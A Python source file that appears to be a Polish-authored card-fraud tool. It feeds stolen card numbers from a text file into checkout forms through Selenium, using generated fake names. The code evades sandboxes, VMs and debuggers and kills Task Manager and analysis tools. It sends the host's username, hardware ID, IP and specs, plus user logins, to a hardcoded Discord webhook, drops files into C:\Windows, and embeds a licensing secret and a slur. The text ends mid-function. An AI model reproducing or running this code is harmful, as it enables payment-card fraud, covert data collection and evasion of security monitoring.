from multiprocessing.sharedctypes import Value
import dearpygui.dearpygui as dpg
from urllib.request import Request, urlopen
from dearpygui import *
import json as jsond  
import time
from discord_webhook import DiscordWebhook
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException
import json
import binascii
import requests
import names
from uuid import uuid4  
import platform
import random
import string
import subprocess
import datetime
import sys
import os.path
import re, ctypes
import uuid
import wmi, psutil
import time
import threading
import wget
import os
import sys
import os
import hashlib
import ctypes
import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from pypresence import Presence
import re
import urllib.request
import urllib.parse
import psutil
import os
from requests import get
import psutil
import json
from urllib.request import Request, urlopen
import random
import time
import names
from customtkinter import *
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException
import sys
import time
import platform
import os
import hashlib
from time import sleep
from datetime import datetime
from colorama import Fore
import requests
import time
import platform
import os
from dhooks import Webhook
import hashlib
from time import sleep
from datetime import datetime
import os
import json as jsond  # json
import time  # sleep before exit
import binascii  # hex encoding
from uuid import uuid4  # gen random guid
import platform  # check platform
import subprocess  # needed for mac device

###############################################MODULES###############################################

def get_base_prefix_compat(): # define all of the checks
    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

def in_virtualenv(): 
    return get_base_prefix_compat() != sys.prefix

if in_virtualenv() == True: # if we are in a vm
    sys.exit() # exit



os.system("cls")

stat = requests.get('https://pastebin.com/raw/hyZi0aTE')
status = stat.text
if status == "True":
    print("dziala")
else:
    time.sleep(3)
    exit()

###############################################SETTINGS###############################################
vmcheck_switch = True #Enabled by default / Check if this file is running on a vm
vtdetect_switch = True #Enabled by default / Info sending through Discord webhook
listcheck_switch = True #Disabled by default / will block all blacklisted virustotal machines
anti_debug_switch = True #Disabled by default / block debugger programs
#If everything is on the program will be "fully protected"!
api = "https://canary.discord.com/api/webhooks/1066455338343219210/wls-EGGtKCDlPRz_s14CHTdbEi31s_KUKlaiJh4EwG-4dci_-JSqAaivyExavxUWpgga" #DISCORD WEBHOOK
hide_console_switch = True #HIDE CONSOLE SWITCH / Disabled by default, console will auto show after the user logged in(set it to false if u want to see the errors)
live_ban_checking = False #Disabled by default / checks if the user is banned and auto closes app.
width = 500
height = 700
programblacklist = ["httpdebuggerui.exe", "wireshark.exe", "HTTPDebuggerSvc.exe", "fiddler.exe", "regedit.exe", "taskmgr.exe", "vboxservice.exe", "df5serv.exe", "processhacker.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "ida64.exe", "ollydbg.exe","pestudio.exe", "vmwareuser", "vgauthservice.exe", "vmacthlp.exe", "x96dbg.exe", "vmsrvc.exe", "x32dbg.exe", "vmusrvc.exe", "prl_cc.exe", "prl_tools.exe", "xenservice.exe", "qemu-ga.exe", "joeboxcontrol.exe", "ksdumperclient.exe", "ksdumper.exe", "joeboxserver.exe"]
###############################################SETTINGS###############################################


def block_debuggers():
    while True:
        time.sleep(1)
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in programblacklist):
                try:
                    print("\nBlacklisted program found! Name: "+str(proc.name()))
                    proc.kill()
                    os._exit(1) 
                except(psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

def block_dlls():
    while True:
        time.sleep(1)
        try:
            sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll")
            print("Sandboxie DLL Detected")
            requests.post(f'{api}',json={'content': f"**Sandboxie DLL Detected**"})
            os._exit(1)
        except:
            pass  



serveruser = os.getenv("UserName")
pc_name = os.getenv("COMPUTERNAME")
mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
computer = wmi.WMI()
os_info = computer.Win32_OperatingSystem()[0]
os_name = os_info.Name.encode('utf-8').split(b'|')[0]
os_name = str(os_name).replace("'","");os_name = str(os_name).replace("b","")
gpu = computer.Win32_VideoController()[0].Name
ip = get('https://api.my-ip.io/ip').text
hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
hwidlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt')
pcnamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt')
pcusernamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt')
maclist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt')
gpulist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt')
platformlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_platforms.txt')

def vtdetect():
    webhooksend = Webhook(api)
    webhooksend.send(f"""```yaml
![PC DETECTED]!  
PC Name: {pc_name}
PC Username: {serveruser}
HWID: {hwid}
ip: {format(ip)}
PLATFORM: {os_name}
CPU: {computer.Win32_Processor()[0].Name}
RAM: {str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB
GPU: {gpu}
TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}```""")

def vmcheck():
    def get_base_prefix_compat(): # define all of the checks
        return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

    def in_virtualenv(): 
        return get_base_prefix_compat() != sys.prefix

    if in_virtualenv() == True: # if we are in a vm
        requests.post(f'{api}',json={'content': f"**VM DETECTED EXITING PROGRAM...**"})
        os._exit(1) # exit
    
    else:
        pass

    def registry_check():  #VM REGISTRY CHECK SYSTEM [BETA]
        reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")       
        
        if reg1 != 1 and reg2 != 1:    
            print("VMware Registry Detected")
            requests.post(f'{api}',json={'content': f"**VMware Registry Detected**"})
            os._exit(1)

    def processes_and_files_check():
        vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
        virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")    

        process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
        processList = []
        for processNames in process.split(" "):
            if ".exe" in processNames:
                processList.append(processNames.replace("K\n", "").replace("\n", ""))

        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
            print("VMwareService.exe & VMwareTray.exe process are running")
            requests.post(f'{api}',json={'content': f"**VMwareService.exe & VMwareTray.exe process are running**"})
            os._exit(1)
                        
        if os.path.exists(vmware_dll): 
            print("Vmware DLL Detected")
            requests.post(f'{api}',json={'content': f"**Vmware DLL Detected**"})
            os._exit(1)
            
        if os.path.exists(virtualbox_dll):
            print("VirtualBox DLL Detected")
            requests.post(f'{api}',json={'content': f"**VirtualBox DLL Detected**"})
            os._exit(1)
        
        try:
            sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll")
            print("Sandboxie DLL Detected")
            requests.post(f'{api}',json={'content': f"**Sandboxie DLL Detected**"})
            os._exit(1)
        except:
            pass        

    def mac_check():
        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        vmware_mac_list = ["00:05:69", "00:0c:29", "00:1c:14", "00:50:56"]
        if mac_address[:8] in vmware_mac_list:
            print("VMware MAC Address Detected")
            requests.post(f'{api}',json={'content': f"**VMware MAC Address Detected**"})
            os._exit(1)
    registry_check()
    processes_and_files_check()
    mac_check()



def listcheck():
    try:
        if hwid in hwidlist.text:
            print('BLACKLISTED HWID DETECTED')
            print(f'HWID: {hwid}') 
            requests.post(f'{api}',json={'content': f"**Blacklisted HWID Detected. HWID:** `{hwid}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2) 
        os._exit(1)

    try:
        if serveruser in pcusernamelist.text:
            print('BLACKLISTED PC USER DETECTED!')
            print(f'PC USER: {serveruser}') 
            requests.post(f'{api}',json={'content': f"**Blacklisted PC User:** `{serveruser}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2) 
        os._exit(1)

    try:
        if pc_name in pcnamelist.text:
            print('BLACKLISTED PC NAME DETECTED!')
            print(f'PC NAME: {pc_name}') 
            requests.post(f'{api}',json={'content': f"**Blacklisted PC Name:** `{pc_name}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2) 
        os._exit(1)


    try:
        if mac in maclist.text:
            print('BLACKLISTED MAC DETECTED!')
            print(f'MAC: {mac}') 
            requests.post(f'{api}',json={'content': f"**Blacklisted MAC:** `{mac}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2) 
        os._exit(1)

    try:
        if gpu in gpulist.text:        
            print('BLACKLISTED GPU DETECTED!')
            print(f'GPU: {gpu}') 
            requests.post(f'{api}',json={'content': f"**Blacklisted GPU:** `{gpu}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2) 
        os._exit(1)


if anti_debug_switch == True:
    try:
        b = threading.Thread(name='Anti-Debug', target=block_debuggers)
        b.start()
        b2 = threading.Thread(name='Anti-DLL', target=block_dlls)
        b2.start()
    except:
        pass
else:
    pass

if vtdetect_switch == True:
    vtdetect()
else:
    pass
if vmcheck_switch == True:
    vmcheck()
else:
    pass
if listcheck_switch == True:
    listcheck()
else:
    pass

try:
    if os.name == 'nt':
        import win32security  # get sid (WIN only)
    import requests  # https requests
    from Crypto.Cipher import AES
    from Crypto.Hash import SHA256
    from Crypto.Util.Padding import pad, unpad
except ModuleNotFoundError:
    print("Exception when importing modules")
    print("Installing necessary modules....")
    if os.path.isfile("requirements.txt"):
        os.system("pip install -r requirements.txt")
    else:
        os.system("pip install pywin32")
        os.system("pip install pycryptodome")
        os.system("pip install requests")
    print("Modules installed!")
    time.sleep(1.5)
    os._exit(1)

try:  # Connection check
    s = requests.Session()  # Session
    s.get('https://google.com')
except requests.exceptions.RequestException as e:
    print(e)
    time.sleep(3)
    os._exit(1)


class api:

    name = ownerid = secret = version = hash_to_check = ""

    def __init__(self, name, ownerid, secret, version, hash_to_check):
        self.name = name

        self.ownerid = ownerid

        self.secret = secret

        self.version = version
        self.hash_to_check = hash_to_check
        self.init()

    sessionid = enckey = ""
    initialized = False

    def init(self):

        if self.sessionid != "":
            print("You've already initialized!")
            time.sleep(2)
            os._exit(1)
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        self.enckey = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("init".encode()),
            "ver": encryption.encrypt(self.version, self.secret, init_iv),
            "hash": self.hash_to_check,
            "enckey": encryption.encrypt(self.enckey, self.secret, init_iv),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        if response == "KeyAuth_Invalid":
            print("The application doesn't exist")
            os._exit(1)

        response = encryption.decrypt(response, self.secret, init_iv)
        json = jsond.loads(response)

        if json["message"] == "invalidver":
            if json["download"] != "":
                print("New Version Available")
                download_link = json["download"]
                os.system(f"start {download_link}")
                os._exit(1)
            else:
                print("Invalid Version, Contact owner to add download link to latest app version")
                os._exit(1)

        if not json["success"]:
            print(json["message"])
            os._exit(1)

        self.sessionid = json["sessionid"]
        self.initialized = True
        self.__load_app_data(json["appinfo"])

    def register(self, user, password, license, hwid=None):
        self.checkinit()
        if hwid is None:
            hwid = others.get_hwid()

        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("register".encode()),
            "username": encryption.encrypt(user, self.enckey, init_iv),
            "pass": encryption.encrypt(password, self.enckey, init_iv),
            "key": encryption.encrypt(license, self.enckey, init_iv),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            print("successfully registered")
            self.__load_user_data(json["info"])
        else:
            print(json["message"])
            os._exit(1)

    def upgrade(self, user, license):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("upgrade".encode()),
            "username": encryption.encrypt(user, self.enckey, init_iv),
            "key": encryption.encrypt(license, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            print("successfully upgraded user")
            print("please restart program and login")
            time.sleep(2)
            os._exit(1)
        else:
            print(json["message"])
            os._exit(1)

    def login(self, user, password, hwid=None):
        self.checkinit()
        if hwid is None:
            hwid = others.get_hwid()

        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("login".encode()),
            "username": encryption.encrypt(user, self.enckey, init_iv),
            "pass": encryption.encrypt(password, self.enckey, init_iv),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            self.__load_user_data(json["info"])
            print("successfully logged in")
            dpg.hide_item("login")
            dpg.show_item("Hardware")
            jareczek = "> zalogowal sie : **" + user + "**"
            webhook = DiscordWebhook(url='https://canary.discord.com/api/webhooks/1066455338343219210/wls-EGGtKCDlPRz_s14CHTdbEi31s_KUKlaiJh4EwG-4dci_-JSqAaivyExavxUWpgga', content=jareczek)
            webhook.execute()
        else:
            print(json["message"])
            os._exit(1)

    def license(self, key, hwid=None):
        self.checkinit()
        if hwid is None:
            hwid = others.get_hwid()

        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("license".encode()),
            "key": encryption.encrypt(key, self.enckey, init_iv),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            self.__load_user_data(json["info"])
            print("successfully logged into license")
        else:
            print(json["message"])
            os._exit(1)

    def var(self, name):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("var".encode()),
            "varid": encryption.encrypt(name, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            return json["message"]
        else:
            print(json["message"])
            time.sleep(5)
            os._exit(1)

    def getvar(self, var_name):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("getvar".encode()),
            "var": encryption.encrypt(var_name, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            return json["response"]
        else:
            print(json["message"])
            time.sleep(5)
            os._exit(1)

    def setvar(self, var_name, var_data):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify("setvar".encode()),
            "var": encryption.encrypt(var_name, self.enckey, init_iv),
            "data": encryption.encrypt(var_data, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            return True
        else:
            print(json["message"])
            time.sleep(5)
            os._exit(1)

    def ban(self):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify("ban".encode()),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            return True
        else:
            print(json["message"])
            time.sleep(5)
            os._exit(1)

    def file(self, fileid):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("file".encode()),
            "fileid": encryption.encrypt(fileid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if not json["success"]:
            print(json["message"])
            time.sleep(5)
            os._exit(1)
        return binascii.unhexlify(json["contents"])

    def webhook(self, webid, param, body = "", conttype = ""):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("webhook".encode()),
            "webid": encryption.encrypt(webid, self.enckey, init_iv),
            "params": encryption.encrypt(param, self.enckey, init_iv),
            "body": encryption.encrypt(body, self.enckey, init_iv),
            "conttype": encryption.encrypt(conttype, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            return json["message"]
        else:
            print(json["message"])
            time.sleep(5)
            os._exit(1)

    def check(self):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify("check".encode()),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)
        if json["success"]:
            return True
        else:
            return False

    def checkblacklist(self):
        self.checkinit()
        hwid = others.get_hwid()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify("checkblacklist".encode()),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)
        if json["success"]:
            return True
        else:
            return False

    def log(self, message):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("log".encode()),
            "pcuser": encryption.encrypt(os.getenv('username'), self.enckey, init_iv),
            "message": encryption.encrypt(message, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        self.__do_request(post_data)

    def fetchOnline(self):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("fetchOnline".encode()),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            if len(json["users"]) == 0:
                return None  # THIS IS ISSUE ON KEYAUTH SERVER SIDE 6.8.2022, so it will return none if it is not an array.
            else:
                return json["users"]
        else:
            return None

    def chatGet(self, channel):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("chatget".encode()),
            "channel": encryption.encrypt(channel, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            return json["messages"]
        else:
            return None

    def chatSend(self, message, channel):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("chatsend".encode()),
            "message": encryption.encrypt(message, self.enckey, init_iv),
            "channel": encryption.encrypt(channel, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            return True
        else:
            return False

    def checkinit(self):
        if not self.initialized:
            print("Initialize first, in order to use the functions")
            time.sleep(2)
            os._exit(1)

    def __do_request(self, post_data):
        try:
            rq_out = s.post(
                "https://keyauth.win/api/1.0/", data=post_data, timeout=30
            )
            return rq_out.text
        except requests.exceptions.Timeout:
            print("Request timed out")

    class application_data_class:
        numUsers = numKeys = app_ver = customer_panel = onlineUsers = ""


    class user_data_class:
        username = ip = hwid = expires = createdate = lastlogin = subscription = subscriptions = ""

    user_data = user_data_class()
    app_data = application_data_class()

    def __load_app_data(self, data):
        self.app_data.numUsers = data["numUsers"]
        self.app_data.numKeys = data["numKeys"]
        self.app_data.app_ver = data["version"]
        self.app_data.customer_panel = data["customerPanelLink"]
        self.app_data.onlineUsers = data["numOnlineUsers"]

    def __load_user_data(self, data):
        self.user_data.username = data["username"]
        self.user_data.ip = data["ip"]
        self.user_data.hwid = data["hwid"]
        self.user_data.expires = data["subscriptions"][0]["expiry"]
        self.user_data.createdate = data["createdate"]
        self.user_data.lastlogin = data["lastlogin"]
        self.user_data.subscription = data["subscriptions"][0]["subscription"]
        self.user_data.subscriptions = data["subscriptions"]


class others:
    @staticmethod
    def get_hwid():
        if platform.system() == "Linux":
            with open("/etc/machine-id") as f:
                hwid = f.read()
                return hwid
        elif platform.system() == 'Windows':
            winuser = os.getlogin()
            sid = win32security.LookupAccountName(None, winuser)[0]  # You can also use WMIC (better than SID, some users had problems with WMIC)
            hwid = win32security.ConvertSidToStringSid(sid)
            return hwid
        elif platform.system() == 'Darwin':
            output = subprocess.Popen("ioreg -l | grep IOPlatformSerialNumber", stdout=subprocess.PIPE, shell=True).communicate()[0]
            serial = output.decode().split('=', 1)[1].replace(' ', '')
            hwid = serial[1:-2]
            return hwid



class encryption:
    @staticmethod
    def encrypt_string(plain_text, key, iv):
        plain_text = pad(plain_text, 16)

        aes_instance = AES.new(key, AES.MODE_CBC, iv)

        raw_out = aes_instance.encrypt(plain_text)

        return binascii.hexlify(raw_out)

    @staticmethod
    def decrypt_string(cipher_text, key, iv):
        cipher_text = binascii.unhexlify(cipher_text)

        aes_instance = AES.new(key, AES.MODE_CBC, iv)

        cipher_text = aes_instance.decrypt(cipher_text)

        return unpad(cipher_text, 16)

    @staticmethod
    def encrypt(message, enc_key, iv):
        try:
            _key = SHA256.new(enc_key.encode()).hexdigest()[:32]

            _iv = SHA256.new(iv.encode()).hexdigest()[:16]

            return encryption.encrypt_string(message.encode(), _key.encode(), _iv.encode()).decode()
        except:
            print("Invalid Application Information. Long text is secret short text is ownerid. Name is supposed to be app name not username")
            os._exit(1)

    @staticmethod
    def decrypt(message, enc_key, iv):
        try:
            _key = SHA256.new(enc_key.encode()).hexdigest()[:32]

            _iv = SHA256.new(iv.encode()).hexdigest()[:16]

            return encryption.decrypt_string(message.encode(), _key.encode(), _iv.encode()).decode()
        except:
            print("Invalid Application Information. Long text is secret short text is ownerid. Name is supposed to be app name not username")
            os._exit(1)

def getchecksum():
    print("kar")
    
linkline = 0

keyauthapp = api(
    name = "Adam",
    ownerid = "TtAoE4tPk3",
    secret = "9f3e256f5e04bf539617b3b872e05df7febf255baa970b59b7d363f09ffd0489",
    version = "1.0",
    hash_to_check = getchecksum()
)

plec = ["male", "female"]
randomplec = random.randint(1,2)
if randomplec == 1: plec1 = 'male'
else: plec1 = 'female'
imieinazwisko = names.get_full_name(gender=plec1)
print(imieinazwisko)

path = 'C:\Windows\Venix'
isExist = os.path.exists(path)
if not isExist:
    os.makedirs(path)
    print("The new directory is created!")
path3 = 'C:/windows/Venix/Bahnschrift400.otf'
isExist3 = os.path.exists(path3)
if not isExist3:
    wget.download("https://github.com/Vlxne1/Arizona/raw/main/Bahnschrift400.otf", "C:\Windows\Venix\Bahnschrift400.otf")
    
path4 = 'C:\Windows\Venix\credits.png'
isExist4 = os.path.exists(path4)
if not isExist4:
    wget.download("https://github.com/cheeseballs687/jarek/raw/main/credits.png", "C:\Windows\Venix\credits.png")

path5 = 'C:\Windows\Venix\credit.png'
isExist5 = os.path.exists(path5)
if not isExist5:
    print("wifi")
    wget.download("https://github.com/cheeseballs687/jarek/raw/main/credit.png", "C:\Windows\Venix\credit.png")   












path7 = 'C:\Windows\Venix\credit.png'
isExist7 = os.path.exists(path7)
if not isExist7:
    print("wifi")
    wget.download("https://github.com/cheeseballs687/jarek/raw/main/credit.png", "C:\Windows\Venix\credit.png")  
    os.system("start nazwa") 

















def login():
    user = dpg.get_value(inputlogin1)
    password = dpg.get_value(inputlogin2)
    keyauthapp.login(user, password)

def register():
    user = dpg.get_value(inputlogin1)
    password = dpg.get_value(inputlogin2)
    license = dpg.get_value(inputlogin2)
    keyauthapp.register(user, password, license)


dpg.create_context()

with dpg.font_registry():
    font1 = dpg.add_font("C:\Windows\Venix\Bahnschrift400.otf", 12)
    font2 = dpg.add_font("C:\Windows\Venix\Bahnschrift400.otf", 14)
    font3 = dpg.add_font("C:\Windows\Venix\Bahnschrift400.otf", 16)
    font4 = dpg.add_font("C:\Windows\Venix\Bahnschrift400.otf", 18)
    font5 = dpg.add_font("C:\Windows\Venix\Bahnschrift400.otf", 20)
    font6 = dpg.add_font("C:\Windows\Venix\Bahnschrift400.otf", 26)
 

    
def HardB():
    dpg.hide_item("Debloat")
    dpg.show_item("Hardware")


def DebB():
    dpg.hide_item("Hardware")
    dpg.show_item("Debloat")




def FuncDebloat():
    os.system("start https://discord.gg/stripetop")
#here debloat tweaks

def random_char(y):
       return ''.join(random.choice(string.ascii_letters) for x in range(y))

def FuncHit1(self):
            global linkline
            CCSFile = open("kardty.txt", "r")
            for cc in CCSFile.readlines():
                mail123 = dpg.get_value(inputemail)
                #link123 = str(self.entryhmv_32.get())
                cc = cc.split("|")
                number = cc[0]
                name = f"{imieinazwisko}"
                expiry_date = cc[1] + cc[2].removeprefix("20")
                verif_code = cc[3]

                os.system("cls")
                chrome_options = Options()
                os.system("cls")
                
                #chrome_options.add_argument("--headless")
                
                os.system("cls")
                driver = webdriver.Chrome("chromedriver",chrome_options=chrome_options)
                os.system("cls")

                    
                try:
                    f=open('links.txt')
                    lines=f.readlines()
                    linkw = lines[linkline]
                    os.system("cls")
                    driver.get(f"{linkw}")
                    os.system("cls")
                    driver.maximize_window()
                    os.system("cls")
                    original_window = driver.current_window_handle
                    os.system("cls")
                    #print(original_window)  
                    print(f"{linkw}") 

                    driver.implicitly_wait(2)
                    os.system("cls")

                    if driver.current_window_handle != original_window:
                        print("nigga")

                    driver.find_element(By.XPATH, '//*[@id="cardExpiry"]').send_keys(expiry_date)
                    driver.implicitly_wait(0.1)
                    driver.find_element(By.XPATH, '//*[@id="cardCvc"]').send_keys(verif_code)
                    driver.implicitly_wait(0.1)
                    driver.find_element(By.XPATH, '//*[@id="billingName"]').send_keys(name)
                    driver.implicitly_wait(0.1)
                    driver.find_element(By.XPATH, '//*[@id="cardNumber"]').send_keys(number)
